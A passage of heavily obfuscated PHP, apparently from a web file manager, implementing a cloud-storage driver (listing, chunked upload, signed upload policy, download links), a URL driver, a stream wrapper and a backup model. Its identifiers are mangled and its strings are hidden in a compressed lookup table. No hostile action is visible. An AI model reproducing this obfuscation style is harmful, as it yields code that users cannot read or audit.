$µÑõŞß‚[$µû†ßÛ§] = $this->fileInfo($ÈœšÒ±Ø[$©ÍÛùûú[32]], $ûäÅ‹ÒÂ, $ÈœšÒ±Ø); } return array($©ÍÛùûú[82] => $âãûÂÛš, $©ÍÛùûú[83] => $µÑõŞß‚); } public function has($û†™ÔÛ¸, $ÍõçÙôŸ = false, $º‹“âô = true) { $ïµë­¡¶ =& $_SERVER[­õöî’–]; $ë¡ˆò±‡ = $ïµë­¡¶[12]; $Ê°€–ô = 500; $õï×•°Õ = 0; $ÁŠ‘€°à = 0; $Ö¢ÏÒ”‹ = rtrim($û†™ÔÛ¸, $ïµë­¡¶[8]) . $ïµë­¡¶[8]; while (!0) { check_abort(); $Æ€›‹ = $this->listObjs($û†™ÔÛ¸, $ë¡ˆò±‡, $Ê°€–ô); if (!$Æ€›‹) { return !1; } $ë¡ˆò±‡ = isset($Æ€›‹[$ïµë­¡¶[1476]]) ? $Æ€›‹[$ïµë­¡¶[1476]] : $ïµë­¡¶[12]; $¤‡×ËßÊ = isset($Æ€›‹[$ïµë­¡¶[1477]]) ? $Æ€›‹[$ïµë­¡¶[1477]] : array(); if (empty($¤‡×ËßÊ)) { break; } $ğ…İËŞ€ = array_filter($¤‡×ËßÊ, function ($Ø™’ÉŞ´) { $‹î Û¨‹ =& $_SERVER[­õöî’–]; return $Ø™’ÉŞ´[$‹î Û¨‹[33]] == $‹î Û¨‹[75]; }); $‘ª²À¤œ = count($¤‡×ËßÊ); $ğ…İËŞ€ = count($ğ…İËŞ€); $•Ù‹£âá = $‘ª²À¤œ - $ğ…İËŞ€; if ($ÍõçÙôŸ) { $ÁŠ‘€°à += $ğ…İËŞ€; $õï×•°Õ += $•Ù‹£âá; if ($‘ª²À¤œ < $Ê°€–ô) { break; } continue; } if ($º‹“âô) { if ($•Ù‹£âá) { return !0; } } else { if ($ğ…İËŞ€) { return !0; } } if ($‘ª²À¤œ < $Ê°€–ô) { break; } } if ($ÍõçÙôŸ) { return array($ïµë­¡¶[207] => $õï×•°Õ, $ïµë­¡¶[208] => $ÁŠ‘€°à); } return !1; } public function listAll($ÃÏ»…¬Ş) { $ÍÜ©á¹ö =& $_SERVER[­õöî’–]; $ñ°¶©‹ = $áòœ¡”Û = array(); $this->fileList($ÃÏ»…¬Ş, $ñ°¶©‹, $áòœ¡”Û, !0); $ôì—˜» = array(); foreach ($áòœ¡”Û as $ƒË°§) { $ôì—˜»[$ƒË°§[$ÍÜ©á¹ö[32]]] = $ƒË°§[$ÍÜ©á¹ö[76]]; } foreach ($ñ°¶©‹ as $ƒË°§) { if (is_string($ƒË°§)) { $ôì—˜»[$ƒË°§] = 0; } } return $this->listAllFiles($ÃÏ»…¬Ş, array_keys($ôì—˜»), $ôì—˜»); } public function canRead($‹¾€Âì¿) { return $this->exist($‹¾€Âì¿) ? !0 : !1; } public function canWrite($Û÷ÜâÕ) { return $this->exist($Û÷ÜâÕ) ? !0 : !1; } public function getContent($¥ëÉğ—¥) { return $this->fileSubstr($¥ëÉğ—¥, 0, -1); } public function setContent($‹·ïœ¦ , $®›Å¨ğÑ = '') { $°•ÂÓÄ =& $_SERVER[­õöî’–]; if (!$®›Å¨ğÑ) { $ÄÙ§İ­× = $this->ussRequest($‹·ïœ¦ , $°•ÂÓÄ[226]); return $ÄÙ§İ­×[$°•ÂÓÄ[1211]]; } $¼œŸ™¡Õ = $this->tempFile($this->pathThis($‹·ïœ¦ )); file_put_contents($¼œŸ™¡Õ, $®›Å¨ğÑ); if ($this->upload($‹·ïœ¦ , $¼œŸ™¡Õ)) { $this->tempFileRemve($¼œŸ™¡Õ); return !0; } return !1; } public function fileSubstr($ğÆú“´±, $æşİĞé, $š«Ğ®Ü) { $ß°¶çµ =& $_SERVER[­õöî’–]; if (!($ìğ°êû = $this->link($ğÆú“´±))) { return !1; } $®íò’”ã = !1; if ($š«Ğ®Ü > 0) { $Ú¿«ÔÎ† = $æşİĞé + $š«Ğ®Ü - 1; $®íò’”ã = array($ß°¶çµ[1439] . $æşİĞé . $ß°¶çµ[386] . $Ú¿«ÔÎ†); } $ê€ê‘ÁÈ = url_request($ìğ°êû, $ß°¶çµ[230], !1, $®íò’”ã); return $ê€ê‘ÁÈ[$ß°¶çµ[741]] ? $ê€ê‘ÁÈ[$ß°¶çµ[1201]] : !1; } public function upload($ĞĞú¾›¼, $®úñïÌ, $¨”ĞäÓÑ = false, $Ó¶ÎŸÕí = REPEAT_REPLACE) { $»„²ÜÀ½ =& $_SERVER[­õöî’–]; $—¦Ó±†‰ = IO::size($®úñïÌ); if ($—¦Ó±†‰ <= 1024 * 1024 * 200) { $¾’Ø¥ã = array($»„²ÜÀ½[1479] . $®úñïÌ); $Å±‘íÁÛ = $this->ussRequest($ĞĞú¾›¼, $»„²ÜÀ½[228], $¾’Ø¥ã); return $Å±‘íÁÛ[$»„²ÜÀ½[1211]] ? $this->getPathOuter($ĞĞú¾›¼) : !1; } $Œè–§° = 1024 * 1024 * 10; $ª”ëú = array($»„²ÜÀ½[1480], $»„²ÜÀ½[1481] . $—¦Ó±†‰, $»„²ÜÀ½[1482], $»„²ÜÀ½[1483] . $Œè–§°); $Å±‘íÁÛ = $this->ussRequest($ĞĞú¾›¼, $»„²ÜÀ½[228], !1, $ª”ëú); if (!$Å±‘íÁÛ[$»„²ÜÀ½[1211]]) { return !1; } $ È¼€«¯ = $Å±‘íÁÛ[$»„²ÜÀ½[1201]]; $ûç»ù” = 0; $ƒâ©ô²¡ = $ È¼€«¯[$»„²ÜÀ½[1484]]; $å´½¤õ = fopen($®úñïÌ, $»„²ÜÀ½[1388]); if (!$å´½¤õ) { return !1; } do { $ÆíÑ›¥° = $ È¼€«¯[$»„²ÜÀ½[1485]]; fseek_64($å´½¤õ, $ûç»ù”); $™—˜„ŒŒ = fread($å´½¤õ, $ÆíÑ›¥°); $Ğ¦Ÿò»ã = 0; do { $Ğ¦Ÿò»ã++; $ È¼€«¯ = $this->uploadPart($ĞĞú¾›¼, $ È¼€«¯, $™—˜„ŒŒ); } while (!$ È¼€«¯ && $Ğ¦Ÿò»ã < 3); if (!$ È¼€«¯) { return !1; } $ƒâ©ô²¡ = $ È¼€«¯[$»„²ÜÀ½[1484]]; $ûç»ù” += $ÆíÑ›¥°; } while ($ƒâ©ô²¡ != -1); fclose($å´½¤õ); $ª”ëú = array($»„²ÜÀ½[1486], $»„²ÜÀ½[1487] . $ È¼€«¯[$»„²ÜÀ½[1488]], $»„²ÜÀ½[1482]); $Å±‘íÁÛ = $this->ussRequest($ĞĞú¾›¼, $»„²ÜÀ½[228], !1, $ª”ëú); return $Å±‘íÁÛ[$»„²ÜÀ½[1211]] ? $this->getPathOuter($»ô¤Ç“¥) : !1; } private function uploadPart($Ğ›ˆë¯, $•û×æ…, &$ƒÍö‚°Ì) { $Úè¢Øºı =& $_SERVER[­õöî’–]; $ôğ·æŠ¸ = array($Úè¢Øºı[1489], $Úè¢Øºı[1487] . $•û×æ…[$Úè¢Øºı[1488]], $Úè¢Øºı[1490] . $•û×æ…[$Úè¢Øºı[1484]], $Úè¢Øºı[142] . $•û×æ…[$Úè¢Øºı[1485]]); $±éŞØ‚é = $this->ussRequest($Ğ›ˆë¯, $Úè¢Øºı[228], $ƒÍö‚°Ì, $ôğ·æŠ¸); return !$±éŞØ‚é[$Úè¢Øºı[1211]] ? $±éŞØ‚é[$Úè¢Øºı[1211]] : $±éŞØ‚é[$Úè¢Øºı[1201]]; } public function uploadFormData($ûÉÖÉ¿, $àø ®à = 3600) { return $this->uploadPolicy($ûÉÖÉ¿, $àø ®à); } public function multiUploadFormData($Ë‡ÌÓÀÆ, $ î Èë = 3600) { $Ş³±í¸å =& $_SERVER[­õöî’–]; $®‚ì‰â¯ = (int) $GLOBALS[$Ş³±í¸å[7]][$Ş³±í¸å[76]]; return $this->uploadPolicy($Ë‡ÌÓÀÆ, $ î Èë, $®‚ì‰â¯); } private function uploadPolicy($–úÏŞ¦æ, $ÎìÅ‰ï = 3600, $““¦òŠ© = 0) { $ªòæ¾Şà =& $_SERVER[­õöî’–]; $ºÊòñÆ = $ªòæ¾Şà[8] . $this->bucket; $Ó¸Ğ÷å = gmdate($ªòæ¾Şà[1424]); $¼µ„“ô‰ = array($ªòæ¾Şà[1491] => $this->bucket, $ªòæ¾Şà[1492] => $–úÏŞ¦æ, $ªòæ¾Şà[1493] => time() + $ÎìÅ‰ï, $ªòæ¾Şà[1494] => $Ó¸Ğ÷å); if ($““¦òŠ©) { $¼µ„“ô‰[$ªòæ¾Şà[1404]] = $““¦òŠ©; } $÷Òå®°æ = base64_encode(json_encode($¼µ„“ô‰)); $†ô¤«İ = base64_encode(hash_hmac($ªòæ¾Şà[1461], "\120\117\x53\124\46{$ºÊòñÆ}\46{$Ó¸Ğ÷å}\46{$÷Òå®°æ}", md5("{$this->userpass}"), !0)); $¡¾³ÌÖ‚ = array($ªòæ¾Şà[1329] => $÷Òå®°æ, $ªòæ¾Şà[1495] => "\125\120\131\125\116\40{$this->username}\x3a{$†ô¤«İ}", $ªòæ¾Şà[181] => $this->endpoint . $ºÊòñÆ); return $¡¾³ÌÖ‚; } public function download($ğáÆ µ¬, $ÎèËûí) { $Ğ–ú‚ÍŞ = IO::getPathInner(IO::mkfile($ÎèËûí)); if (!($ÃËÒ»°Ö = $this->link($ğáÆ µ¬))) { return !1; } $ÑŞÑ·ÜÙ = 0; $¦ò•±¦ = 1024 * 200; $Šó®šÓß = fopen($Ğ–ú‚ÍŞ, $_SERVER[­õöî’–][1445]); while (!0) { $âèù£æü = $this->fileSubstr($ğáÆ µ¬, $ÑŞÑ·ÜÙ, $¦ò•±¦); if ($âèù£æü === !1) { return !1; } fwrite($Šó®šÓß, $âèù£æü); $ÑŞÑ·ÜÙ += $¦ò•±¦; if (strlen($âèù£æü) < $¦ò•±¦) { break; } } fclose($Šó®šÓß); return $ÎèËûí; } public function link($¡ûÀ÷äÒ, $•ğ‡Ş…Ç = array()) { $˜”‘şá© =& $_SERVER[­õöî’–]; $¡ûÀ÷äÒ = trim($¡ûÀ÷äÒ, $˜”‘şá©[8]); if (!empty($this->token)) { $ËÉ¿õ•é = strtotime(date($˜”‘şá©[1496])); $‡¹ÏÙìš = substr(md5($this->token . $˜”‘şá©[284] . $ËÉ¿õ•é . $˜”‘şá©[1497] . $¡ûÀ÷äÒ), 12, 8) . $ËÉ¿õ•é; $•ğ‡Ş…Ç[] = $˜”‘şá©[1498] . $‡¹ÏÙìš; } $óê¢ÛÆ = !empty($•ğ‡Ş…Ç) ? $˜”‘şá©[73] . implode($˜”‘şá©[284], $•ğ‡Ş…Ç) : $˜”‘şá©[12]; return $this->getHost() . $˜”‘şá©[8] . $¡ûÀ÷äÒ . $óê¢ÛÆ; } public function fileOut($™Ì‹‹, $¿‘òôÆ = false, $ã¡‰àĞÄ = false, $³›¡±† = '') { if ($this->isFileOutServer()) { return $this->fileOutServer($™Ì‹‹, $¿‘òôÆ, $ã¡‰àĞÄ, $³›¡±†); } if (!$ã¡‰àĞÄ) { $ã¡‰àĞÄ = $this->pathThis($™Ì‹‹); } $Ú„åööı = $¿‘òôÆ ? array($_SERVER[­õöî’–][1499] . rawurlencode($ã¡‰àĞÄ)) : array(); $Éøå”£¼ = $this->link($™Ì‹‹, $Ú„åööı); $this->fileOutLink($Éøå”£¼); } public function fileOutServer($úŠœËÌ, $ñî¾È…ô = false, $ˆÄÒ»™ = false, $Æ¥Š¨½ = '') { parent::fileOut($úŠœËÌ, $ñî¾È…ô, $ˆÄÒ»™, $Æ¥Š¨½); } public function fileOutImage($ß¾è¹î‰, $¾ï¦£Ïü = 250) { $”‹œì˜ = $this->link($ß¾è¹î‰ . $_SERVER[­õöî’–][1500] . $¾ï¦£Ïü); $this->fileOutLink($”‹œì˜); } public function fileOutImageServer($ĞÅŞß¶õ, $¥å›‘„ü = 250) { parent::fileOutImage($ĞÅŞß¶õ, $¥å›‘„ü); } public function hashMd5($²ìÕó”æ) { $®Ôöå”ã =& $_SERVER[­õöî’–]; $Œõî…‹Ñ = $this->_objectMeta($²ìÕó”æ); return isset($Œõî…‹Ñ[$®Ôöå”ã[212]]) ? $Œõî…‹Ñ[$®Ôöå”ã[212]] : !1; } public function size($¿‘¬Í™œ) { $õíÓıó£ = $this->objectMeta($¿‘¬Í™œ); return $õíÓıó£ ? $õíÓıó£[$_SERVER[­õöî’–][76]] : 0; } public function info($êçóôÈİ) { if ($this->isFolder($êçóôÈİ)) { return $this->folderInfo($êçóôÈİ); } else { if ($this->isFile($êçóôÈİ)) { return $this->fileInfo($êçóôÈİ); } } return !1; } public function exist($ó¾£œø) { return $this->isFile($ó¾£œø) || $this->isFolder($ó¾£œø); } public function isFile($­•ºÎ–’) { return !$this->isFolder($­•ºÎ–’) && $this->objectMeta($­•ºÎ–’); } public function isFolder($†œÏĞ‘) { return $this->cacheMethod($_SERVER[­õöî’–][165], $†œÏĞ‘); } protected function objectMeta($ƒôçÜ´ı) { return $this->cacheMethod($_SERVER[­õöî’–][167], $ƒôçÜ´ı); } protected function _objectMeta($ÇĞ³É›ß) { $ÅŞááÄì =& $_SERVER[­õöî’–]; if ($ÇĞ³É›ß == $ÅŞááÄì[12] || $ÇĞ³É›ß == $ÅŞááÄì[8]) { return array(); } $¡°Š®‰¼ = $this->ussRequest($ÇĞ³É›ß, $ÅŞááÄì[1501]); if (!$¡°Š®‰¼[$ÅŞááÄì[1211]]) { return null; } $’ıáÛÖ– = isset($¡°Š®‰¼[$ÅŞááÄì[1201]]) ? $¡°Š®‰¼[$ÅŞááÄì[1201]] : array(); if (!isset($’ıáÛÖ–[$ÅŞááÄì[1502]])) { return null; } $Ş«ÄÍØŸ = array($ÅŞááÄì[33] => isset($’ıáÛÖ–[$ÅŞááÄì[1502]]) ? $’ıáÛÖ–[$ÅŞááÄì[1502]] : null, $ÅŞááÄì[76] => isset($’ıáÛÖ–[$ÅŞááÄì[1503]]) ? $’ıáÛÖ–[$ÅŞááÄì[1503]] : null, $ÅŞááÄì[212] => isset($’ıáÛÖ–[$ÅŞááÄì[1504]]) ? $’ıáÛÖ–[$ÅŞááÄì[1504]] : null, $ÅŞááÄì[1471] => isset($’ıáÛÖ–[$ÅŞááÄì[1505]]) ? $’ıáÛÖ–[$ÅŞááÄì[1505]] : null); $Ş«ÄÍØŸ[$ÅŞááÄì[1472]] = isset($’ıáÛÖ–[$ÅŞááÄì[1506]]) ? strtotime($’ıáÛÖ–[$ÅŞááÄì[1506]]) : $Ş«ÄÍØŸ[$ÅŞááÄì[1471]]; return $Ş«ÄÍØŸ; } protected function _isFolder($î¡Ñá³) { $ÜÌ¹¥¹Ø =& $_SERVER[­õöî’–]; if ($î¡Ñá³ == $ÜÌ¹¥¹Ø[12] || $î¡Ñá³ == $ÜÌ¹¥¹Ø[8]) { return !0; } $³©ùÔä¦ = $this->_objectMeta($î¡Ñá³); return isset($³©ùÔä¦[$ÜÌ¹¥¹Ø[33]]) && $³©ùÔä¦[$ÜÌ¹¥¹Ø[33]] == $ÜÌ¹¥¹Ø[75] ? !0 : !1; } } class PathDriverUrl extends PathDriverBase { static $_cacheHeader = array(); public function __construct($×Ò±áåü = false) { } public function exist($¤Ó‰·) { $²ùŞ‰—á = $this->info($¤Ó‰·); return $²ùŞ‰—á[$_SERVER[­õöî’–][201]]; } public function isFile($ĞòºÚõ×) { $äúÚœ÷€ = $this->info($ĞòºÚõ×); return $äúÚœ÷€[$_SERVER[­õöî’–][201]]; } public function isFolder($§Í—©ƒç) { return !1; } public function size($Â¨Ä·Ã) { $ªóˆÁËà = $this->info($Â¨Ä·Ã); return $ªóˆÁËà[$_SERVER[­õöî’–][76]]; } public function info($ïá€˜¶) { return $this->infoParse($ïá€˜¶); } public function infoAuth($½ôî¢¶ù) { return $this->infoParse($½ôî¢¶ù); } public function infoWithChildren($œ»ßµ’) { return $this->infoParse($œ»ßµ’); } public function infoFull($åºÃ®Éà) { return $this->infoParse($åºÃ®Éà); } private function infoParse($ÄšŸØöá) { $Ç¥ñŞÎ¡ =& $_SERVER[­õöî’–]; $ÎèĞÈÊ = $this->header($ÄšŸØöá); if (!$ÎèĞÈÊ || !$ÎèĞÈÊ[$Ç¥ñŞÎ¡[741]]) { return !1; } $µûıˆË§ = _get($ÎèĞÈÊ, $Ç¥ñŞÎ¡[337], 0); $Ç³ò¡³ù = array($Ç¥ñŞÎ¡[32] => $ÎèĞÈÊ[$Ç¥ñŞÎ¡[32]], $Ç¥ñŞÎ¡[84] => $ÄšŸØöá, $Ç¥ñŞÎ¡[33] => $Ç¥ñŞÎ¡[199], $Ç¥ñŞÎ¡[76] => intval($µûıˆË§), $Ç¥ñŞÎ¡[174] => get_path_ext($ÎèĞÈÊ[$Ç¥ñŞÎ¡[32]]), $Ç¥ñŞÎ¡[1385] => $µûıˆË§ > 0 && $ÎèĞÈÊ[$Ç¥ñŞÎ¡[1507]], $Ç¥ñŞÎ¡[1386] => !1); return $Ç³ò¡³ù; } private function header($µÇ¨†ã‘) { $ÚÃôø‹” =& $_SERVER[­õöî’–]; if (isset(self::$_cacheHeader[$µÇ¨†ã‘])) { return self::$_cacheHeader[$µÇ¨†ã‘]; } $é¸ç“¾ = isset($GLOBALS[$ÚÃôø‹”[1508]]) ? $GLOBALS[$ÚÃôø‹”[1508]] : !1; $GLOBALS[$ÚÃôø‹”[1508]] = !0; self::$_cacheHeader[$µÇ¨†ã‘] = url_header($µÇ¨†ã‘); $GLOBALS[$ÚÃôø‹”[1508]] = $é¸ç“¾; return self::$_cacheHeader[$µÇ¨†ã‘]; } public function hashSimple($˜£¡–ô, $ùûò¹¦Á = false) { $¦¤ëËœ =& $_SERVER[­õöî’–]; $³ı‹„˜Â = $this->info($˜£¡–ô); if (!$³ı‹„˜Â || !$³ı‹„˜Â[$¦¤ëËœ[201]]) { return !1; } $¤œ€êòö = $³ı‹„˜Â[$¦¤ëËœ[76]]; $åÉ§íœ› = 200; $³ò­ÙŒ¶ = 50; if ($¤œ€êòö <= $åÉ§íœ› * $³ò­ÙŒ¶) { return md5($this->fileSubstr($˜£¡–ô, 0, $¤œ€êòö)) . $¤œ€êòö; } $³£øŸ¼› = intval($¤œ€êòö / $³ò­ÙŒ¶); $¹°Ä´– = $¦¤ëËœ[12]; $¬şÚÈÖğ = timeFloat(); $•Ïäçù = 15; for ($›Îòí» = 0; $›Îòí» < $³ò­ÙŒ¶; $›Îòí»++) { if (timeFloat() - $¬şÚÈÖğ > $•Ïäçù) { return !1; } $àÍÖ£üË = $this->fileSubstr($˜£¡–ô, $³£øŸ¼› * $›Îòí», $åÉ§íœ›); if (!$àÍÖ£üË) { return !1; } $¹°Ä´– .= $àÍÖ£üË; } $¹°Ä´– .= $this->fileSubstr($˜£¡–ô, $¤œ€êòö - $åÉ§íœ›, $åÉ§íœ›); return md5($¹°Ä´–) . $¤œ€êòö; } public function getContent($Ø—ß ö—) { return $this->fileSubstr($Ø—ß ö—); } public function fileSubstr($é–Ï˜èË, $ø½¾Éü÷ = 0, $Ûß¨¢ôà = -1) { $€›«›—¶ =& $_SERVER[­õöî’–]; $½®á÷İ = $this->info($é–Ï˜èË); if (!$½®á÷İ || !$½®á÷İ[$€›«›—¶[201]] && $½®á÷İ[$€›«›—¶[76]] > 1024 * 1024 * 10) { return !1; } if ($Ûß¨¢ôà === -1) { $Ûß¨¢ôà = $½®á÷İ[$€›«›—¶[76]]; } if ($Ûß¨¢ôà == 0) { return $€›«›—¶[12]; } $ç…êÂ» = array($€›«›—¶[1509] . $ø½¾Éü÷ . $€›«›—¶[773] . ($ø½¾Éü÷ + $Ûß¨¢ôà - 1)); $±§õ¯í = url_request($é–Ï˜èË, $€›«›—¶[230], !1, $ç…êÂ», !1, !1, 30); return $±§õ¯í[$€›«›—¶[1201]] ? $±§õ¯í[$€›«›—¶[1201]] : $€›«›—¶[12]; } public function download($è–©²ªä, $ÒÉ¼¿”) { Downloader::start($è–©²ªä, $ÒÉ¼¿”); return $ÒÉ¼¿”; } } class StreamWrapperIO { private $path; private $info; private $pose = 0; static $_fopenCache = array(); static $_chunkBuffer = array(); private $timeStart = 0; function stream_open($ø¹“ìÔ, $ùï¦†Ù¤ = '') { $this->info = $this->info($ø¹“ìÔ); $this->timeStart = timeFloat(); $this->path = $this->info[$_SERVER[­õöî’–][84]]; $this->pathOpen = $ø¹“ìÔ; if (!$this->info) { return !1; } if (count(self::$_chunkBuffer) > 100) { self::$_chunkBuffer = null; self::$_chunkBuffer = array(); } if (!isset(self::$_chunkBuffer[$ø¹“ìÔ])) { self::$_chunkBuffer[$ø¹“ìÔ] = array(); } self::$_fopenCache[$this->pathOpen] = $this; return $this->info ? !0 : !1; } function stream_read($¼“ı›¬) { $İ˜ëìíÁ = $this->fileSubstr($this->pose, $¼“ı›¬); $this->pose += strlen($İ˜ëìíÁ); return $İ˜ëìíÁ; } public function stream_tell() { return $this->pose; } public function stream_seek($ƒõà´©ı, $’×èñøİ) { $‚Ï±ğ±ß =& $_SERVER[­õöî’–]; if ($’×èñøİ == SEEK_SET) { $this->pose = $ƒõà´©ı; } else { if ($’×èñøİ == SEEK_CUR) { $this->pose += $ƒõà´©ı; } else { if ($’×èñøİ == SEEK_END) { $this->pose = $this->info[$‚Ï±ğ±ß[76]] + intval($ƒõà´©ı); } } } if ($ƒõà´©ı < 0) { $this->pose = $this->info[$‚Ï±ğ±ß[76]] + $ƒõà´©ı; } return !0; } public function stream_eof() { return $this->pose >= $this->info[$_SERVER[­õöî’–][76]]; } public function stream_close() { unset(self::$_fopenCache[$this->pathOpen]); return !0; } public function url_stat($İ´ƒÄ·Ğ, $®†Ûº·§) { $„êªş§ =& $_SERVER[­õöî’–]; $ÂÊâ”„İ = $this->info($İ´ƒÄ·Ğ); return array($„êªş§[1510] => 0, $„êªş§[1511] => 0, $„êªş§[16] => 32768 + 511, $„êªş§[1512] => 0, $„êªş§[1513] => 0, $„êªş§[1514] => 0, $„êªş§[1515] => 0, $„êªş§[76] => $ÂÊâ”„İ[$„êªş§[76]], $„êªş§[1516] => $ÂÊâ”„İ[$„êªş§[1384]], $„êªş§[1472] => $ÂÊâ”„İ[$„êªş§[85]], $„êªş§[1471] => $ÂÊâ”„İ[$„êªş§[200]], $„êªş§[1517] => 0, $„êªş§[1518] => 0); } static $fileInfo = array(); public function info($Á®”„Ã¦) { $‘”áÖ³û = $_SERVER[­õöî’–][1519]; if (isset(self::$fileInfo[$Á®”„Ã¦])) { return self::$fileInfo[$Á®”„Ã¦]; } if (substr($Á®”„Ã¦, 0, strlen($‘”áÖ³û)) != $‘”áÖ³û) { return !1; } self::$fileInfo[$Á®”„Ã¦] = IO::info(substr($Á®”„Ã¦, strlen($‘”áÖ³û))); return self::$fileInfo[$Á®”„Ã¦]; } public static function read($œÓÍ°Ò¯, $ÚÆµÑññ, $€òàæï) { if (!isset(self::$_fopenCache[$œÓÍ°Ò¯])) { $øƒûæ«Î = new StreamWrapperIO(); $øƒûæ«Î->stream_open($œÓÍ°Ò¯); self::$_fopenCache[$œÓÍ°Ò¯] = $øƒûæ«Î; } $øƒûæ«Î = self::$_fopenCache[$œÓÍ°Ò¯]; return $øƒûæ«Î->fileSubstr($ÚÆµÑññ, $€òàæï); } public static function _read($´Ú´·ºÜ, $õÍ¡ó, $»•ÚÀ¦Æ) { $õ¯¶É£ª =& $_SERVER[­õöî’–]; $Òà‰­šÄ = fopen($´Ú´·ºÜ, $õ¯¶É£ª[1388]); if (!$Òà‰­šÄ) { return $õ¯¶É£ª[12]; } $Ù’ß‡´ = 8192; fseek($Òà‰­šÄ, $õÍ¡ó, SEEK_SET); $é°ÂˆûÊ = $õ¯¶É£ª[12]; $­áßî£ã = 0; while ($­áßî£ã < $»•ÚÀ¦Æ) { $éÆ„¸º = min($Ù’ß‡´, $»•ÚÀ¦Æ - $­áßî£ã); $é°ÂˆûÊ .= fread($Òà‰­šÄ, $éÆ„¸º); $­áßî£ã += $éÆ„¸º; } fclose($Òà‰­šÄ); return $é°ÂˆûÊ; } public function fileSubstr($Àıª¼ø¦, $Ø“Úê“€) { $Ó›ø¾ß· =& $_SERVER[­õöî’–]; $æ˜Â×å÷ = $this->info[$Ó›ø¾ß·[76]]; $õ³ÃõúŞ = $Àıª¼ø¦; $ß†ÖÄ = $Ø“Úê“€; if ($Àıª¼ø¦ < 0) { $Àıª¼ø¦ = $æ˜Â×å÷ + $Àıª¼ø¦; } if ($Ø“Úê“€ === !1) { $Ø“Úê“€ = $æ˜Â×å÷ - $Àıª¼ø¦; } if ($Àıª¼ø¦ + $Ø“Úê“€ > $æ˜Â×å÷) { $Ø“Úê“€ = $æ˜Â×å÷ - $Àıª¼ø¦; } if ($Ø“Úê“€ <= 0) { return $Ó›ø¾ß·[12]; } if ($Àıª¼ø¦ < 0 || $Àıª¼ø¦ >= $æ˜Â×å÷ || $Ø“Úê“€ <= 0 || $Ø“Úê“€ > 1024 * 1024 * 10) { throw new Exception("\151\157\x46\151\x6c\x65\x52\x65\141\x64\40\145\x72\x72\x6f\162\x21\x20\163\x74\x61\162\x74\75{$Àıª¼ø¦}\x3b\x6c\145\156\x67\x74\150\x3d{$Ø“Úê“€}\73\40\163\x69\172\145\x3d{$æ˜Â×å÷}\x3b"); } $‚ñ¡şÃÚ = 64 * 1024; $ù³ë¡Í¶ =& self::$_chunkBuffer[$this->path]; if (!$ù³ë¡Í¶) { $ù³ë¡Í¶ = array(); } $ØŸ®µğ× = 0; $Ã½øÊÌÑ = 0; $“à±ïô = $Ó›ø¾ß·[12]; foreach ($ù³ë¡Í¶ as $ØŸ®µğ× => $“à±ïô) { $ØŸ®µğ× = intval($ØŸ®µğ×); $Ã½øÊÌÑ = $ØŸ®µğ× + strlen($“à±ïô); if ($Àıª¼ø¦ >= $Ã½øÊÌÑ) { continue; } if ($Àıª¼ø¦ >= $ØŸ®µğ× && $Àıª¼ø¦ + $Ø“Úê“€ <= $Ã½øÊÌÑ) { return substr($“à±ïô, $Àıª¼ø¦ - $ØŸ®µğ×, $Ø“Úê“€); } break; } if (count($ù³ë¡Í¶) > 100 || timeFloat() - $this->timeStart > 2.0) { $this->log($Ó›ø¾ß·[1520], $Ó›ø¾ß·[1521] . count($ù³ë¡Í¶) . "\x3b\x73\164\141\162\164\x3d{$Àıª¼ø¦}\x2c\154\145\156\147\164\x68\x3d{$Ø“Úê“€}\x3b\x70\157\163\x65\72{$ØŸ®µğ×}\176{$Ã½øÊÌÑ}"); throw new Exception($Ó›ø¾ß·[1522]); } $Ø®¿à‚ = intval($Àıª¼ø¦ / $‚ñ¡şÃÚ) * $‚ñ¡şÃÚ; $Óâ•­Áİ = ceil(($Àıª¼ø¦ + $Ø“Úê“€) / $‚ñ¡şÃÚ) * $‚ñ¡şÃÚ - $Ø®¿à‚; $ëšşîñÙ = IO::fileSubstr($this->path, $Ø®¿à‚, $Óâ•­Áİ); $ù³ë¡Í¶[$Ø®¿à‚ . $Ó›ø¾ß·[12]] = $ëšşîñÙ; ksort($ù³ë¡Í¶); $Å¢Ãù¯ = substr($ëšşîñÙ, $Àıª¼ø¦ - $Ø®¿à‚, $Ø“Úê“€); return $Å¢Ãù¯; } private function log($İ¨³ÑıÎ, $ÓáöÚ«) { $«å¸ûü° =& $_SERVER[­õöî’–]; $’»¼å¿¯ = timeFloat() - $this->timeStart; write_log(sprintf($«å¸ûü°[1523], $İ¨³ÑıÎ, $this->info[$«å¸ûü°[32]], $’»¼å¿¯, $ÓáöÚ«), $«å¸ûü°[1181]); } } goto C—ĞÑ‚¾âõ; B‡ÈÆ¹ó¨: define($_SERVER[­õöî’–][241], 1); define($_SERVER[­õöî’–][242], 0); define($_SERVER[­õöî’–][243], 2); goto Cåìñ¬Éš; e¸Îñ°™«°: define($_SERVER[­õöî’–][612], $_SERVER[­õöî’–][613]); $fqldphzwjt = $_SERVER[­õöî’–][614]; $_SERVER[øû®”õ ] = explode($_SERVER[­õöî’–][615], gzinflate(substr($_SERVER[­õöî’–][616], 10, -8))); goto dœšâñ±…¶; C¡­¿Ş®¼: class BackupModel extends ModelBaseLight { public $optionType = "\x53\171\x73\x74\145\x6d\x2e\142\141\143\x6b\x75\x70\114\x69\x73\164"; public $field = array("\x69\157", "\156\x61\155\145", "\163\x74\141\x74\165\x73", "\x63\x6f\156\164\145\156\164", "\155\141\156\x75\141\154", "\x72\145\x73\165\x6c\164", "\x74\151\155\x65\x46\x72\157\x6d", "\164\151\155\145\x54\x6f"); public function config() { $ÏŞ‘Şå« =& $_SERVER[­õöî’–]; $­õí ±½ = Model($ÏŞ‘Şå«[761])->get($ÏŞ‘Şå«[771]); $­õí ±½ = json_decode($­õí ±½, !0); $­õí ±½ = is_array($­õí ±½) ? $­õí ±½ : array(); if (!isset($­õí ±½[$ÏŞ‘Şå«[746]])) { $­õí ±½[$ÏŞ‘Şå«[746]] = $ÏŞ‘Şå«[88]; } unset($­õí ±½[$ÏŞ‘Şå«[1630]]); Action($ÏŞ‘Şå«[1874])->taskInit(); Model($ÏŞ‘Şå«[1629])->cacheClear(); $’ŸÍ¯Ö = $ÏŞ‘Şå«[1875]; $½şŒ«¶» = Model($ÏŞ‘Şå«[1876])->findByKey($ÏŞ‘Şå«[1648], $’ŸÍ¯Ö); if (!$½şŒ«¶») { $½şŒ«¶» = array(); } if (isset($½şŒ«¶»[$ÏŞ‘Şå«[203]])) { $½şŒ«¶»[$ÏŞ‘Şå«[203]] = json_decode($½şŒ«¶»[$ÏŞ‘Şå«[203]], !0); } if (isset($­õí ±½[$ÏŞ‘Şå«[203]])) { $½şŒ«¶»[$ÏŞ‘Şå«[203]][$ÏŞ‘Şå«[1633]] = $­õí ±½[$ÏŞ‘Şå«[203]]; 